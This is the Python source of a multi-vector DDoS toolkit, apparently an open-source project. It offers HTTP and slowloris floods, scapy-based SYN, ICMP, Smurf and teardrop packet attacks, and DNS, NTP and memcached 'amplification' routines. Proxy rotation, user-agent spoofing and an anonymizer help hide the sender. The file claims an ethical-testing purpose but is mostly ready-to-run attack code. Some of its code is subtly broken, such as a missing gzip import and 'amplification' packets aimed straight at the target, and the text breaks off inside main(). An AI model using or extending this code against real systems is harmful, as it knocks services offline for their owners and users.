#!/usr/bin/env python3
# -*- coding: utf-8 -*-
### BEGIN INIT INFO
# Provides:          ddos_toolkit
# Required-Start:    $network $remote_fs
# Required-Stop:     $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: DDoS Attack Toolkit
# Description:       A toolkit designed for simulating various types of Distributed Denial of Service (DDoS) attacks for ethical cybersecurity testing.
# Author:
# + LIONMAD <https://github.com/Midohajhouj>
# Version:           v.1.0
# License:           MIT License - https://opensource.org/licenses/MIT
### END INIT INFO ###

import sys # Install module with pip sys --break-system-packages
import importlib # Install module with pip importlib --break-system-packages

def check_library(lib_name):
    """Checks if a library is installed and prompts to install it if not."""
    try:
        importlib.import_module(lib_name)
    except ImportError:
        print(f"{lib_name} is not installed.")
        print(f"Install it using: pip install {lib_name} --break-system-packages")
        sys.exit(1)
        
# ================== Third-Party Libraries ==================
# Check for third-party libraries.
required_libraries = [
    "aiohttp", "asyncio", "argparse", "scapy.all", "dns.resolver",
    "colorama", "tqdm"
]

for lib in required_libraries:
    # Handle libraries with dot notation like 'scapy.all'
    check_library(lib.split(".")[0])

# Libraries are now guaranteed to be installed. Import them.
import aiohttp  # Install module with pip aiohttp --break-system-packages
import asyncio  # Install module with pip asyncio --break-system-packages
import time  # Install module with pip time --break-system-packages
import argparse  # Install module with pip argparse --break-system-packages
import threading  # Install module with pip threading --break-system-packages
from concurrent.futures import ThreadPoolExecutor, as_completed  # Install module with pip concurrent.futures --break-system-packages
import random  # Install module with pip random --break-system-packages
import json  # Install module with pip json --break-system-packages
from itertools import cycle  # Install module with pip itertools --break-system-packages
from collections import deque  # Install module with pip collections --break-system-packages
from uuid import uuid4  # Install module with pip uuid --break-system-packages
from base64 import b64encode  # Install module with pip base64 --break-system-packages
import hashlib  # Install module with pip hashlib --break-system-packages
import zlib  # Install module with pip zlib --break-system-packages
import hmac  # Install module with pip hmac --break-system-packages
import signal  # Install module with pip signal --break-system-packages
import sys  # Install module with pip sys --break-system-packages
import os  # Install module with pip os --break-system-packages
import subprocess  # Install module with pip subprocess --break-system-packages
import socket  # Install module with pip socket --break-system-packages
import struct  # Install module with pip struct --break-system-packages
import logging  # Install module with pip logging --break-system-packages
import psutil  # Install module with pip psutil --break-system-packages
import shutil  # Install module with pip shutil --break-system-packages
import scapy.all as scapy  # Install module with pip scapy --break-system-packages
import dns.resolver  # Install module with pip dnspython --break-system-packages
from colorama import init, Fore, Style  # Install module with pip colorama --break-system-packages
from tqdm import tqdm  # Install module with pip tqdm --break-system-packages
from typing import Optional

# Initialize colorama for colorized terminal output
init(autoreset=True)
# Colors
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
RESET = Style.RESET_ALL

# Global variables
requests_sent = 0
successful_requests = 0
failed_requests = 0
last_time = time.time()
requests_lock = threading.Lock()
rps_history = deque(maxlen=60)
stop_event = threading.Event()

# User-Agent list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Linux; Android 4.4.4; Nexus 5 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.2.2; Nexus 4 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.159 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edge/94.0.992.31",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; AS-KDG) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Edge/79.0.309.71",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; AS-KDG) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36 Edge/17.17134",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; AS-KDG) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 Edge/17.17134",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
]

HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]

# Set up logging configuration
logging.basicConfig(
    level=logging.INFO,  # Set logging level to INFO or DEBUG as needed
    format='%(asctime)s - %(levelname)s - %(message)s',  # Define the log format
    handlers=[logging.StreamHandler()]  # Print logs to the console
)

logger = logging.getLogger(__name__)  # Create a logger for this module

def display_banner():
    print(f"""
{BLUE}
██████████████████████████████████████████████████████████████████████████████████████████████████                                     
 ▄▄▄▄▄    ▄▄▄▄▄      ▄▄▄▄     ▄▄▄▄     ▄▄▄▄▄▄▄▄   ▄▄▄▄     ▄▄▄▄   ▄▄      ▄▄   ▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄          
 ██▀▀▀██  ██▀▀▀██   ██▀▀██  ▄█▀▀▀▀█    ▀▀▀██▀▀▀  ██▀▀██   ██▀▀██  ██      ██  ██▀  ▀▀██▀▀ ▀▀▀██▀▀▀ 
 ██    ██ ██    ██ ██    ██ ██▄           ██    ██    ██ ██    ██ ██      ██▄██      ██      ██    
 ██    ██ ██    ██ ██    ██  ▀████▄       ██    ██    ██ ██    ██ ██      █████      ██      ██    
 ██    ██ ██    ██ ██    ██      ▀██      ██    ██    ██ ██    ██ ██      ██  ██▄    ██      ██    
 ██▄▄▄██  ██▄▄▄██   ██▄▄██  █▄▄▄▄▄█▀      ██     ██▄▄██   ██▄▄██  ██▄▄▄▄▄ ██   ██▄ ▄▄██▄▄    ██         
 ▀▀▀▀▀    ▀▀▀▀▀      ▀▀▀▀    ▀▀▀▀▀        ▀▀      ▀▀▀▀     ▀▀▀▀   ▀▀▀▀▀▀▀ ▀▀    ▀▀ ▀▀▀▀▀▀    ▀▀    
 |U|S|E| |T|H|E| |T|O|O|L|  |A|T| |Y|O|U|R| |O|W|N| |R|I|S|K|  |M|I|D|O|  |S|A|L|U|T|   |Y|O|U|                                                                                        
██████████████████████████████████████████████████████████████████████████████████████████████████
{RESET}
""")

def minimal_help():
    print(f"""
{YELLOW}DDoS MultiVector Toolkit Coded by MIDO
{YELLOW}Usage: ddos [options]
{RESET}
Options:
  -h, --help            Show the full help message and exit
  -i, --interactive     Start the interactive CLI
  -u URL, --url URL     Target URL or IP address
  -a ATTACK_MODE, --attack-mode ATTACK_MODE
                        Type of attack to perform (http-flood, slowloris, etc.)
  -t THREADS, --threads THREADS
                        Number of threads
  -r RATE_LIMIT, --rate-limit RATE_LIMIT
                        Rate limit for requests per second
  -d DURATION, --duration DURATION
                        Attack duration (seconds)
  --proxies PROXIES     File containing proxy list
  --results RESULTS     File to save results (JSON)
{RESET}
Example:
  ddos -u 192.168.48.165
  ddos -i  # Start interactive mode
""")

def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="DDoS Toolkit Coded By LIONBAD")
    parser.add_argument("-u", "--url", required=False, help="Target URL or IP address")
    parser.add_argument("-a", "--attack-mode", choices=["http-flood", "slowloris", "udp-flood", "syn-flood", "icmp-flood", "dns-amplification", "ftp-flood", "ssh-flood", "ntp-amplification", "memcached-amplification", "smurf", "teardrop"], default="http-flood", help="Type of attack to perform")
    parser.add_argument("-s", "--scan", action="store_true", help="Perform a network scan using NetScan lib ")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("-r", "--rate-limit", type=int, default=100, help="Rate limit for requests per second")
    parser.add_argument("-p", "--pause", type=float, default=0.1, help="Pause time between requests")
    parser.add_argument("-d", "--duration", type=int, default=1500, help="Attack duration (seconds)")
    parser.add_argument("--anonymizer", choices=["start", "stop"], help="Enable or disable anonymizer for anonymity")
    parser.add_argument("--proxies", help="File containing proxy list")
    parser.add_argument("--headers", help="Custom headers as JSON string")
    parser.add_argument("--payload", choices=["json", "xml", "form"], default="json", help="Payload type")
    parser.add_argument("--results", help="File to save results (JSON)")
    parser.add_argument("--retry", type=int, default=3, help="Number of retries for failed requests")
    parser.add_argument("-user", "--user-agents", help="File containing custom user-agent strings")
    parser.add_argument("-m", "--multi-target", help="File containing multiple target URLs or IPs")
    return parser.parse_args()

def load_proxies(proxy_file: str):
    """Load proxies from a file."""
    try:
        with open(proxy_file, "r") as f:
            proxy_list = f.read().splitlines()
        valid_proxies = [p.strip() for p in proxy_list if p.strip()]
        print(f"Loaded {len(valid_proxies)} proxies.")
        return valid_proxies
    except FileNotFoundError:
        print(f"Proxy file '{proxy_file}' not found.")
        return []

def validate_proxies(proxies):
    """Validate proxies."""
    validated_proxies = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_proxy = {executor.submit(check_proxy, proxy): proxy for proxy in proxies}
        for future in as_completed(future_to_proxy):
            proxy = future_to_proxy[future]
            try:
                if future.result():
                    validated_proxies.append(proxy)
            except Exception as e:
                logging.error(f"Proxy validation failed for {proxy}: {e}")
    print(f"Validated {len(validated_proxies)} proxies.")
    return validated_proxies

async def check_proxy(proxy: str):
    """Check if a proxy is valid."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
                return response.status == 200
    except Exception:
        return False

async def check_proxy_health(proxy: str):
    """Check the health of a proxy."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
                return response.status == 200
    except Exception:
        return False

async def monitor_proxy_health(proxies):
    """Continuously monitor the health of proxies."""
    while not stop_event.is_set():
        for proxy in proxies:
            if not await check_proxy_health(proxy):
                proxies.remove(proxy)
                print(f"Removed unhealthy proxy: {proxy}")
        await asyncio.sleep(60)  # Check every 60 seconds
        
def generate_payload(payload_type: str, secret_key: Optional[bytes] = None) -> Optional[bytes]:
    
    if secret_key is None:
        secret_key = os.getenv("SECRET_KEY", b"your_default_secret_key")  # Load from environment or default
    
    try:
        # Generate unique payload identifier
        payload_id = str(uuid4())
        data = b64encode(os.urandom(64)).decode()
        
        # Create the payload dictionary
        payload = {"id": payload_id, "data": data}
        
        # Sign the payload using HMAC and SHA-256
        payload_str = json.dumps(payload, separators=(',', ':'))
        signature = hmac.new(secret_key, payload_str.encode(), hashlib.sha256).hexdigest()
        payload["signature"] = signature
        
        # Log the generated signature for debugging
        logger.debug(f"Generated signature: {signature}")

        # Compress the payload based on the selected type
        if payload_type == "json":
            compressed_payload = compress_payload(json.dumps(payload).encode())
        elif payload_type == "xml":
            # Create XML-formatted payload
            xml_payload = f"<data><id>{payload_id}</id><value>{data}</value><signature>{signature}</signature></data>"
            compressed_payload = compress_payload(xml_payload.encode(), compression_type="gzip")  # Optionally use gzip
        elif payload_type == "form":
            # Return uncompressed payload as form data (as dictionary)
            return json.dumps(payload).encode()  # Form could be raw JSON or custom
        else:
            logger.error(f"Invalid payload type: {payload_type}")
            return None
        
        return compressed_payload
    except Exception as e:
        logger.error(f"Error generating payload: {e}")
        return None


def compress_payload(data: bytes, compression_type: str = "zlib") -> bytes:
    
    try:
        if compression_type == "gzip":
            # Gzip compression
            compressed_data = gzip.compress(data)
            logger.debug(f"Compressed using gzip: {len(compressed_data)} bytes")
        else:
            # Default to zlib compression
            compressed_data = zlib.compress(data)
            logger.debug(f"Compressed using zlib: {len(compressed_data)} bytes")
        
        return compressed_data
    except Exception as e:
        logger.error(f"Error compressing data: {e}")
        return data  # Return uncompressed data if compression fails

def run_network_scanner(target_ip):
    """Run the netscan script with enhanced error handling and validation."""
    try:
        # Define the main directory for netscan.py
        netscan_path = "/opt/DDoS-Toolkit/assets/netscan"
        
        # Check if netscan.py exists in the defined directory
        if not os.path.isfile(netscan_path):
            print(f"{RED}[!] netscan not found in /opt/DDoS-Toolkit/assets/ ...... Aborting.{RESET}")
            return

        # Check if Python3 is installed
        if not shutil.which("python3"):
            print(f"{RED}[!] Python3 is not installed or not in PATH. Please install it to proceed.{RESET}")
            return

        # Build the command
        command = ["python3", netscan_path, "-t", target_ip]

        # Execute the command
        print(f"{BLUE}[*] Starting network scan on {target_ip}...{RESET}")
        subprocess.run(command, check=True)

        print(f"{GREEN}[+] Network scan on {target_ip} completed successfully.{RESET}")

    except subprocess.CalledProcessError as cpe:
        print(f"{RED}[!] Error during network scan: {cpe}.{RESET}")
    except FileNotFoundError as fnf:
        print(f"{RED}[!] Required file or command not found: {fnf}.{RESET}")
    except Exception as e:
        print(f"{RED}[!] An unexpected error occurred: {e}.{RESET}")

def run_anonymizer(mode):
    """Run the anonymizer script with error handling and validation."""
    try:
        # Define the main directory for anonymizer
        anonymizer_path = "/opt/DDoS-Toolkit/assets/anonymizer"
        
        # Check if anonymizer exists in the defined directory
        if not os.path.isfile(anonymizer_path):
            print(f"{RED}[ERROR] anonymizer script not found in {anonymizer_path}. Aborting.{RESET}")
            sys.exit(1)  # Exit the script
        
        # Validate the mode
        if mode not in ["start", "stop"]:
            print(f"{YELLOW}[WARNING] Invalid mode '{mode}' specified. Please use 'start' or 'stop'.{RESET}")
            sys.exit(1)  # Exit the script
        
        # Build the command
        command = ["bash", anonymizer_path, mode]
        
        # Notify user about the action
        action_message = "Starting" if mode == "start" else "Stopping"
        print(f"{BLUE}[INFO] {action_message} anonymizer...{RESET}")
        
        # Execute the command
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Check command result
        if result.returncode == 0:
            print(f"{GREEN}[SUCCESS] anonymizer {mode} completed successfully!{RESET}")
        else:
            print(f"{RED}[ERROR] anonymizer {mode} failed with return code {result.returncode}.{RESET}")
            print(f"{RED}[DETAILS] {result.stderr.strip()}{RESET}")
            sys.exit(1)  # Exit the script on failure
    
    except FileNotFoundError:
        print(f"{RED}[ERROR] 'bash' not found. Ensure bash is installed and available in PATH.{RESET}")
        sys.exit(1)  # Exit the script
    
    except subprocess.SubprocessError as e:
        print(f"{RED}[ERROR] Subprocess error occurred: {e}{RESET}")
        sys.exit(1)  # Exit the script
    
    except Exception as e:
        print(f"{RED}[ERROR] An unexpected error occurred: {e}.{RESET}")
        sys.exit(1)  # Exit the script
    
    finally:
        print(f"{BLUE}[INFO] Exiting anonymizer handler.{RESET}")
        sys.exit(0)  # Exit the script after completion
        
async def resolve_target(target_url: str):
    """Resolve the target URL to an IP address."""
    try:
        domain_or_ip = target_url.split("//")[-1].split("/")[0]
        if is_valid_ip(domain_or_ip):
            print(f"Target is an IP address: {domain_or_ip}")
            return domain_or_ip
        # Use dnspython to resolve the domain to an IP
        resolver = dns.resolver.Resolver()
        ip = resolver.resolve(domain_or_ip, "A")[0].to_text()
        print(f"Resolved {domain_or_ip} to IP: {ip}")
        return ip
    except Exception as e:
        logging.error(f"Failed to resolve domain: {e}")
        return None

def is_valid_ip(ip: str):
    """Check if the given string is a valid IP address."""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
    
    global requests_sent, successful_requests, failed_requests, last_time
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                        method = random.choice(HTTP_METHODS)
                        payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None

                        proxy = next(proxy_pool) if proxy_pool else None
                        async with session.request(
                            method, target_url, headers=headers, proxy=proxy, data=payload, timeout=aiohttp.ClientTimeout(total=5)
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                        break  # Exit retry loop if request succeeds
                    except aiohttp.ClientError as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
                        await asyncio.sleep(2 ** attempt)  # Exponential backoff
                    except Exception as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                        await asyncio.sleep(2 ** attempt)  # Exponential backoff
                await asyncio.sleep(pause_time)

async def slowloris_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, retry=3):

    global requests_sent, successful_requests, failed_requests
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                        # Send a partial HTTP request
                        async with session.get(target_url, headers=headers, proxy=next(proxy_pool) if proxy_pool else None) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                        # Keep the connection open by sending partial data
                        await asyncio.sleep(pause_time)
                        break  # Exit retry loop if request succeeds
                    except aiohttp.ClientError as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
                    except Exception as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                await asyncio.sleep(pause_time)


def syn_flood(target_ip, target_port, duration):
    
    print(f"Starting SYN flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Craft a SYN packet using scapy
            ip_layer = scapy.IP(dst=target_ip)
            tcp_layer = scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
            packet = ip_layer / tcp_layer
            scapy.send(packet, verbose=False)
        except Exception as e:
            print(f"Error during SYN flood: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    print("SYN flood attack completed.")


def icmp_flood(target_ip, duration):
    
    print(f"Starting ICMP flood attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Craft an ICMP packet using scapy
            packet = scapy.IP(dst=target_ip) / scapy.ICMP()
            scapy.send(packet, verbose=False)
        except Exception as e:
            print(f"Error during ICMP flood: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    print("ICMP flood attack completed.")


async def dns_amplification(target_ip, duration):
    print(f"Starting DNS amplification attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Craft a DNS amplification packet
            packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname="example.com"))
            scapy.send(packet, verbose=False)
        except Exception as e:
            print(f"Error during DNS amplification: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    print("DNS amplification attack completed.")
    
def ftp_flood(target_ip, target_port, duration):
    """Perform an FTP flood attack."""
    print(f"Starting FTP flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Create a socket and connect to the target FTP server
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((target_ip, target_port))
                # Send a random payload
                sock.send(os.urandom(1024))
        except Exception as e:
            print(f"Error during FTP flood: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    print("FTP flood attack completed.")

def ssh_flood(target_ip, target_port, duration):
    """Perform an SSH flood attack."""
    print(f"Starting SSH flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Create a socket and connect to the target SSH server
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((target_ip, target_port))
                # Send a random payload
                sock.send(os.urandom(1024))
        except Exception as e:
            print(f"Error during SSH flood: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    print("SSH flood attack completed.")

def ntp_amplification(target_ip, duration):
    """Perform an NTP amplification attack."""
    logging.info(f"Starting NTP amplification attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Craft an NTP amplification packet
            packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=123) / scapy.Raw(load=os.urandom(64))
            scapy.send(packet, verbose=False)
        except Exception as e:
            logging.error(f"Error during NTP amplification: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    logging.info("NTP amplification attack completed.")

def memcached_amplification(target_ip, duration):
    """Perform a Memcached amplification attack."""
    logging.info(f"Starting Memcached amplification attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Craft a Memcached amplification packet
            packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=11211) / scapy.Raw(load=os.urandom(64))
            scapy.send(packet, verbose=False)
        except Exception as e:
            logging.error(f"Error during Memcached amplification: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    logging.info("Memcached amplification attack completed.")

def smurf_attack(target_ip, duration):
    """Perform a Smurf attack."""
    logging.info(f"Starting Smurf attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Craft a Smurf attack packet
            packet = scapy.IP(src=target_ip, dst="255.255.255.255") / scapy.ICMP()
            scapy.send(packet, verbose=False)
        except Exception as e:
            logging.error(f"Error during Smurf attack: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    logging.info("Smurf attack completed.")

def teardrop_attack(target_ip, duration):
    """Perform a Teardrop attack."""
    logging.info(f"Starting Teardrop attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Craft a Teardrop attack packet
            packet = scapy.IP(dst=target_ip, flags="MF", frag=0) / scapy.UDP() / ("X" * 64)
            packet2 = scapy.IP(dst=target_ip, flags=0, frag=1) / ("X" * 64)
            scapy.send(packet, verbose=False)
            scapy.send(packet2, verbose=False)
        except Exception as e:
            logging.error(f"Error during Teardrop attack: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    logging.info("Teardrop attack completed.")

async def http2_flood(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
    """Perform an HTTP/2 flood attack."""
    global requests_sent, successful_requests, failed_requests, last_time
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"https://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                        method = random.choice(HTTP_METHODS)
                        payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None

                        proxy = next(proxy_pool) if proxy_pool else None
                        async with session.request(
                            method, target_url, headers=headers, proxy=proxy, data=payload
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                        break  # Exit retry loop if request succeeds
                    except aiohttp.ClientError as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
                    except Exception as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                await asyncio.sleep(pause_time)

def display_status(stop_event: threading.Event, duration: int, results_file=None):
    """Display the status of the load test."""
    start_time = time.time()
    results = []
    with tqdm(total=duration, desc="Progress") as pbar:
        while not stop_event.is_set():
            elapsed = time.time() - start_time
            if elapsed >= duration:
                break
            with requests_lock:
                current_time = time.time()
                rps = requests_sent / max(1, current_time - start_time)
                rps_history.append(rps)
                stats = {
                    "Time": elapsed,
                    "Requests Sent": requests_sent,
                    "Successful Requests": successful_requests,
                    "Failed Requests": failed_requests,
                    "RPS": rps,
                    "CPU Usage": psutil.cpu_percent(),
                    "Memory Usage": psutil.virtual_memory().percent,
                    "Network Usage": psutil.net_io_counters().bytes_sent + psutil.net_io_counters().bytes_recv,
                }
                results.append(stats)
                print(f"{GREEN}Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | RPS: {rps:.2f} | CPU: {stats['CPU Usage']}% | Memory: {stats['Memory Usage']}% | Network: {stats['Network Usage']} bytes{RESET}")
            pbar.update(1)
            time.sleep(1)

    if results_file:
        with open(results_file, "w") as f:
            json.dump(results, f, indent=4)
        print(f"Results saved to {results_file}")

def calculate_rps_stats():
    """Calculate RPS statistics."""
    if not rps_history:
        return {"min": 0, "max": 0, "avg": 0}
    return {
        "min": min(rps_history),
        "max": max(rps_history),
        "avg": sum(rps_history) / len(rps_history),
    }

def signal_handler(sig, frame):
    """Handle interrupt signals."""
    global stop_event
    logging.info(f"{RED}\nInterrupted by user. Exiting gracefully...{RESET}")
    stop_event.set()  # Signal all threads to stop
    sys.exit(0)

async def main():
    """Main function to run the load test."""
    global args
    args = parse_args()

# Handle signals for graceful exit
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    if len(sys.argv) == 1:
        minimal_help()
        sys.exit(0)

    display_banner()

    # If --anonymizer is provided, start or stop anonymizer and exit
    if args.anonymizer:
        print(f"{BLUE}[INFO] {'Starting' if args.anonymizer == 'start' else 'Stopping'} anonymizer...{RESET}")
        run_anonymizer(args.anonymizer)
        exit(0)

    if args.threads <= 0 or args.pause <= 0 or args.duration <= 0 or args.rate_limit <= 0:
        print(f"{RED}Error: Invalid argument values. Ensure all values are positive.{RESET}")
        exit(1)

    # If --scan is provided, perform the scan and exit
    if args.scan:
        target = args.url.split("//")[-1].split("/")[0]
        target_ip = await resolve_target(target)
        if target_ip:
            run_network_scanner(target_ip)
        else:
            print(f"{RED}Exiting: Target is not reachable.{RESET}")
        exit(0)

    proxies = load_proxies(args.proxies) if args.proxies else []
    if proxies:
        proxies = validate_proxies(proxies)
        # Start proxy health monitoring in a separate thread
        asyncio.create_task(monitor_proxy_health(proxies))

    headers = json.loads(args.headers) if args.headers else None

    target = args.url.split("//")[-1].split("/")[0]

    if not await resolve_target(target):
        print(f"{RED}Exiting: Target is not reachable.{RESET}")
        exit(1)

    stop_event = threading.Event()
    tasks = []

    if args.attack_mode == "syn-flood":
        target_ip = await resolve_target(target)
        target_port = 80  # Default port for SYN flood
        threading.Thread(target=syn_flood, args=(target_ip, target_port, args.duration)).start()
    elif args.attack_mode == "icmp-flood":
        target_ip = await resolve_target(target)
